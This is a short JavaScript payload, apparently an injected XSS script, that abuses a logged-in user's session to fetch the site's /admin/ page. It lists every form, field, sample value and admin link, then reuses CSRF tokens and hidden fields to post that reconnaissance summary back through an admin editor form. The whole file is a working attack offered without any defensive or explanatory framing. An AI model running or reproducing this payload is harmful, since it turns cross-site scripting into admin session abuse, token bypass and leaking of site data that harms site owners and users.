(async () => {
  const g = (u,o) => fetch(u, Object.assign({credentials:'include',cache:'no-store'}, o||{}));
  const summ = [];
  try {
    const admin = await (await g('/admin/')).text();
    const doc = new DOMParser().parseFromString(admin, 'text/html');
    const forms = [...doc.querySelectorAll('form')];
    summ.push('ADMIN_FORMS='+forms.length+' url=/admin/');
    forms.forEach((f,fi)=>{
      const fields = [...f.querySelectorAll('input,textarea,select,button')].map(el=>{
        return (el.tagName.toLowerCase())+':'+(el.getAttribute('name')||'-')+':'+(el.getAttribute('type')||'-')+':val='+String(el.value||'').slice(0,20);
      });
      summ.push('FORM#'+fi+' action='+(f.getAttribute('action')||'(self)')+' method='+(f.getAttribute('method')||'GET')+' | '+fields.join(' , '));
    });
    // also list all links in /admin/ overview (editor might be a link)
    const links = [...doc.querySelectorAll('a')].map(a=>a.getAttribute('href')).filter(h=>h&&h.startsWith('/admin'));
    summ.push('ADMIN_LINKS='+[...new Set(links)].join(','));
    const summary = 'RECON903\n'+summ.join('\n')+'\nRECON903END';

    // Try to WRITE summary to homepage via best-guess editor form:
    let target = forms.find(f=>f.querySelector('textarea')) || forms[0];
    if (target) {
      const action = target.getAttribute('action') || '/admin/';
      const method = (target.getAttribute('method')||'POST').toUpperCase();
      const fd = new FormData();
      for (const el of target.querySelectorAll('input,textarea,select,button')) {
        const nm = el.getAttribute('name'); if(!nm) continue;
        const type=(el.getAttribute('type')||'').toLowerCase();
        const isToken = /csrf|token|nonce|_key/i.test(nm) || type==='hidden';
        fd.set(nm, isToken ? (el.value||'') : summary);
      }
      await g(action, {method, body: fd});
    }
  } catch(e){ summ.push('EXC:'+e); }
})();
